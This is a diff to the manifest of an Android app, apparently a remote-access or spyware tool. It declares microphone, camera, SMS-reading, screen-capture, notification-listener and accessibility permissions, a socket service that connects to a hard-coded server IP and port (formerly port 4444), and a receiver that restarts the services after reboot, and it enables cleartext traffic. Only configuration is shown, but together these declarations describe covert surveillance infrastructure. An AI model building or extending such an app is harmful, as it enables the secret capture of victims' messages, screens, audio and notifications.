@@ -5,7 +5,6 @@
     <!-- Core Permissions -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.READ_SMS" />
@@ -17,48 +16,52 @@
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
 
+    <!-- Android 13+ notifications permission -->
+    <uses-permission
+        android:name="android.permission.POST_NOTIFICATIONS"
+        android:required="false" />
+
     <application
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
+        android:usesCleartextTraffic="true"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
-        <!-- Server connection info -->
-        <meta-data
-            android:name="SERVER_IP"
-            android:value="192.168.43.27" />
-        <meta-data
-            android:name="SERVER_PORT"
-            android:value="4444" />
+        <!-- Static server configuration -->
+        <meta-data android:name="SERVER_IP" android:value="192.168.0.179" />
+        <meta-data android:name="SERVER_PORT" android:value="54835" />
 
-        <!-- Main visible screen (first-time permission grant) -->
+        <!-- Entry activity -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:label="@string/app_name"
+            android:launchMode="singleTop"
             android:theme="@style/Theme.AppCompat.Light.NoActionBar"
-            android:launchMode="singleTop">
+            android:label="@string/app_name">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <!-- Foreground and background services -->
+        <!-- Screen capture service -->
         <service
             android:name=".ScreenCaptureService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="mediaProjection" />
 
+        <!-- Socket communication service -->
         <service
             android:name=".SocketService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="mediaProjection|location" />
 
+        <!-- Notification listener -->
         <service
             android:name=".MyNotificationListener"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
@@ -69,6 +72,7 @@
             </intent-filter>
         </service>
 
+        <!-- Accessibility service -->
         <service
             android:name=".MyAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
@@ -82,13 +86,14 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
+        <!-- Background restart job -->
         <service
             android:name=".RestartJobService"
             android:permission="android.permission.BIND_JOB_SERVICE"
             android:enabled="true"
             android:exported="false" />
 
-        <!-- Receiver to restart services after reboot -->
+        <!-- Boot receiver -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -98,4 +103,5 @@
             </intent-filter>
         </receiver>
     </application>
+
 </manifest>
